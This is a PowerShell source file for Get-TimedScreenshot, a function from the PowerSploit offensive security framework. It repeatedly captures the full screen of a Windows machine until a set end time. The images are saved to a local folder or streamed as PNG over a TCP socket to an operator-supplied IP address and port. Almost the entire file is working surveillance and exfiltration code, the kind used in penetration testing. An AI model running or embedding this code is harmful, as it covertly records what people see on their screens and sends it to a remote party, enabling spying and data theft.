function Get-TimedScreenshot
{
<#
.SYNOPSIS

Takes screenshots at a regular interval and saves them to disk or a newtwork endpoint.

PowerSploit Function: Get-TimedScreenshot
Authors: Chris Campbell (@obscuresec), John Laska
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: Get-NetworkData.ps1
    
.DESCRIPTION

A function that takes screenshots and saves them to either a folder or a network endpoint.

.PARAMETER Path

Specifies the folder path.

.PARAMETER IpAddress

Specifies the IpAddress of the target network endpoint.

.PARAMETER Port

Specifies the network port for the target network endpoint.
    
.PARAMETER Interval
    
Specifies the interval in seconds between taking screenshots.

.PARAMETER EndTime

Specifies when the script should stop running in the format HH-MM 

.EXAMPLE 

PS C:\> Get-TimedScreenshot -Path c:\temp\ -Interval 30 -EndTime 14:00 

.EXAMPLE

PS C:\> Get-TimedScreenshot -IpAddress 192.168.1.100 -Port 5555 -Interval 30 -EndTime 14:00 
 
.LINK

http://obscuresecurity.blogspot.com/2013/01/Get-TimedScreenshot.html
https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-TimedScreenshot.ps1
#>

    [CmdletBinding()] Param(
        [Parameter(Mandatory=$True, ParameterSetName='Local')]
        [ValidateScript({Test-Path -Path $_ })]
        [String] $Path, 

        [Parameter(Mandatory=$True, ParameterSetName='Network')]
        $IpAddress,

        [Parameter(Mandatory=$True, ParameterSetName='Network')]
        $Port,

        [Parameter(Mandatory=$True)]             
        [Int32] $Interval,

        [Parameter(Mandatory=$True)]             
        [String] $EndTime
    )

    #Define helper function that generates and saves screenshot
    Function Get-Screenshot {
       $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen

       $VideoController = Get-WmiObject -Query 'SELECT VideoModeDescription FROM Win32_VideoController'

       if ($VideoController.VideoModeDescription -and $VideoController.VideoModeDescription -match '(?<ScreenWidth>^\d+) x (?<ScreenHeight>\d+) x .*$') {
           $Width = [Int] $Matches['ScreenWidth']
           $Height = [Int] $Matches['ScreenHeight']
       } else {
           $ScreenBounds = [Windows.Forms.SystemInformation]::VirtualScreen

           $Width = $ScreenBounds.Width
           $Height = $ScreenBounds.Height
       }

       $Size = New-Object System.Drawing.Size($Width, $Height)
       $Point = New-Object System.Drawing.Point(0, 0)

       $ScreenshotObject = New-Object Drawing.Bitmap $Width, $Height
       $DrawingGraphics = [Drawing.Graphics]::FromImage($ScreenshotObject)
       $DrawingGraphics.CopyFromScreen($Point, [Drawing.Point]::Empty, $Size)
       $DrawingGraphics.Dispose()

       # Send screenshot to requested endpoint
       switch($PSCmdlet.ParameterSetName) 
       {
           'Local' { $ScreenshotObject.Save($FilePath) }
           'Network' 
           {
               $TcpClient = New-Object System.Net.Sockets.TcpClient($IpAddress, $Port)
               try 
               {
                    if($TcpClient.Connected)
                    {
                        $OutputStream = $TcpClient.GetStream()
                        $ScreenshotObject.Save($OutputStream, [System.Drawing.Imaging.ImageFormat]::PNG)
                    }
                }
                catch
                {
                    throw $_
                }
                finally
                {
                    $TcpClient.Close()
                }
           }
       }

       $ScreenshotObject.Dispose()
    }

    Try {
            
        #load required assembly
        Add-Type -Assembly System.Windows.Forms            

        Do {
            #get the current time and build the filename from it
            $Time = (Get-Date)
            
            if($PSCmdlet.ParameterSetName -eq 'Local')
            {
                [String] $FileName = "$($Time.Month)"
                $FileName += '-'
                $FileName += "$($Time.Day)" 
                $FileName += '-'
                $FileName += "$($Time.Year)"
                $FileName += '-'
                $FileName += "$($Time.Hour)"
                $FileName += '-'
                $FileName += "$($Time.Minute)"
                $FileName += '-'
                $FileName += "$($Time.Second)"
                $FileName += '.png'
                
                #use join-path to add path to filename
                [String] $FilePath = (Join-Path $Path $FileName)
            }
            #run screenshot function
            Get-Screenshot
            
            switch($PSCmdlet.ParameterSetName)
            {
                'Local' { Write-Verbose "Saved screenshot to $FilePath. Sleeping for $Interval seconds" }
                'Network' {Write-Verbose "Screenshot sent to $IpAddress`:$Port. Sleeping for $Interval seconds."}
            }
            
            Start-Sleep -Seconds $Interval
        }

        #note that this will run once regardless if the specified time as passed
        While ((Get-Date -Format HH:mm) -lt $EndTime)
    }

    Catch {Write-Error ($Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage)}
}
